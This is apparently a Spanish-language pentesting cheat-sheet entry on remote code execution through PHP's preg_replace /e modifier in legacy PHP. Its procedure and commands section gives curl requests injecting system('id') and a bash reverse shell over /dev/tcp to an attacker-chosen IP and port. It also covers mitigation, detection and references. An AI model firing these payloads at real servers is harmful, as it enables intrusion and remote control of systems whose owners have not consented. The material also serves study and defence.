---
topic: PHP — ejecución con preg_replace /e
tags: [web, php, preg_replace, rce, legacy]
---

# PHP — ejecución con preg_replace /e

[🌐 English](php-preg-replace-e.en.md) | **Español**

## Concepto

El modificador `/e` de `preg_replace` evalúa el reemplazo como código PHP después de la sustitución. Si el reemplazo incluye entrada del usuario, cualquier coincidencia se convierte en ejecución remota. El modificador se eliminó en PHP 7, pero sigue en aplicaciones antiguas.

## Cuándo aplica

- La aplicación usa `preg_replace` con `/e`.
- El patrón o el reemplazo dependen de un parámetro controlable.
- El servidor ejecuta una versión antigua de PHP.

## Procedimiento

1. Localizar llamadas a `preg_replace` con `/e`.
2. Identificar un parámetro que llegue al reemplazo.
3. Inyectar una llamada PHP válida y comprobar la ejecución.
4. Usar la ejecución para una reverse shell.

## Comandos

```bash
grep -RIn "preg_replace.*\/e" /var/www/html
curl -s "http://<HOST>/search.php?q=system('id')"
# Payload de reverse shell
curl -s "http://<HOST>/search.php?q=system('bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"')"
```

## Variantes

- Inyectar en el patrón si el reemplazo es fijo.
- Usar `assert` o `create_function` en versiones aún más antiguas.
- Encadenar con una inclusión de archivo.

## Limitaciones

- Solo funciona en PHP anterior a 7.
- El patrón puede escapar caracteres especiales.
- `disable_functions` puede bloquear `system`.

## Mitigación

- Migrar a `preg_replace_callback` y actualizar PHP.
- Nunca pasar entrada del usuario a patrones o reemplazos.
- Aplicar un WAF y revisar código legado.

## Detección

- Llamadas a `preg_replace` con `/e` en el código.
- Parámetros que contienen funciones PHP o backticks.
- Procesos web que lanzan shells.

## Referencias

- [PHP — preg_replace](https://www.php.net/manual/en/function.preg-replace.php)
- [0xdf — Europa](https://0xdf.gitlab.io/2021/02/02/htb-europa.html)
- [CWE-94 — Code Injection](https://cwe.mitre.org/data/definitions/94.html)
